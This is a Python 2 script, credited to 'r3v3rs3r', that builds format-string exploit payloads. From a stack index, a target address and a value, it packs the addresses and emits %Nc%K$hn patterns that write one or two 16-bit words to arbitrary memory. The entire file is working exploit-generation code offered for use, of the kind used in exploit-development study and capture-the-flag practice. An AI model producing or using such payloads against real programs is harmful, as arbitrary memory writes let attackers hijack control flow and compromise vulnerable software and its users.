#!/usr/bin/python
from struct import pack
import sys
# -----------------------------------------------------------------------------------
# Title			: Formatstring vuln. explotation helper
# About			: Creates a single/double short formatstring exploit pattern
# Author		: r3v3rs3r
# Date 			: 24-12-2014
# -----------------------------------------------------------------------------------



# -----------------------------------------------------------------------------------
def p(v, e='<L'):
	return pack(e, v)


# -----------------------------------------------------------------------------------
def rpad_short(i, l=5):
	return str(i).rjust(l, '0')


# -----------------------------------------------------------------------------------
def single_short_pattern(stackindex, writetoaddress, value, currlen=0):
	"""
	Pattern writes 2 bytes to a address
	
	stackindex			: The index of the input on stack
	writetoaddress		: The address to write to
	value 				: The data to write(WORD)
	currlen 			: The current length of the data(default 0)
	"""	
	
	# update currlen
	currlen += 4
	
	# Calcutate the short value
	len_1 = ((value & 0xFFFF) - currlen) & 0xFFFF
	
	# build and return the pattern
	# Uncomment if you need to add a string to the beginning of the payload, such
	# as navigating through a menu. Also change to += below that.
	#r = "1\n1\n"
	r =  p(writetoaddress)
	r += '%{0}c%{1}$hn'.format(rpad_short(len_1), str(stackindex))

	return r


# -----------------------------------------------------------------------------------
def double_short_pattern(stackindex, writetoaddress, value, currlen=0):
	"""
	Pattern writes 4 bytes to a address

	stackindex			: The index of the input on stack
	writetoaddress		: The address to write to
	value 				: The data to write(DWORD)
	currlen 			: The current length of the data(default 0)
	"""	
	
	# update currlen
	currlen += 8
	
	# Calculate the 2 short values
	len_1 = ((value & 0xFFFF) - currlen) & 0xFFFF
	len_2 = ((((value >> 16) & 0xFFFF) - currlen) - len_1) & 0xFFFF
	
	# build and return the pattern
	# Uncomment if you need to add a string to the beginning of the payload, such
	# as navigating through a menu. Also change to += below that.
	#r = "1\n1\n"
	r =  p(writetoaddress)
	r += p(writetoaddress + 2)
	r += '%{0}c%{1}$hn'.format(rpad_short(len_1), str(stackindex))
	if len_2 != 0:
		r += '%{0}c%{1}$hn'.format(rpad_short(len_2), str(stackindex + 1))
	else:
		r += '%{0}$hn'.format(str(stackindex + 1))
	return r

# -----------------------------------------------------------------------------------
def strtoint(intstr):
	try:
		if intstr.count('x'):
			return int(intstr, 16)
		else:
			return int(intstr)
	except Exception as e:
		print 'Error strtoint: %s' % (e)
		exit()


# -----------------------------------------------------------------------------------
def int_size(value):
	i = (value | 0xFFFF)
	if i == 0xFFFF:
		return 1
	elif i > 0xFFFF:
		return 2
	else:
		return 0

# -----------------------------------------------------------------------------------
if __name__ == '__main__':
	if len(sys.argv) < 4:
		print 'Usage: python frmtstr.py <stack_index> <write_to_address> <value_to_write> <current_length>(OPTIONAL)'
	else:
		stackindex = strtoint(sys.argv[1])
		writetoaddress = strtoint(sys.argv[2])
		value = strtoint(sys.argv[3])
		
		if len(sys.argv) == 5:
			currlen = strtoint(sys.argv[4])
		else:
			currlen = 0

		patternsize = int_size(value)

		if patternsize == 1:
			print single_short_pattern(stackindex, writetoaddress, value, currlen)
		elif patternsize == 2:
			print double_short_pattern(stackindex, writetoaddress, value, currlen)
		else:
			print 'Failed to Calculate the value size'
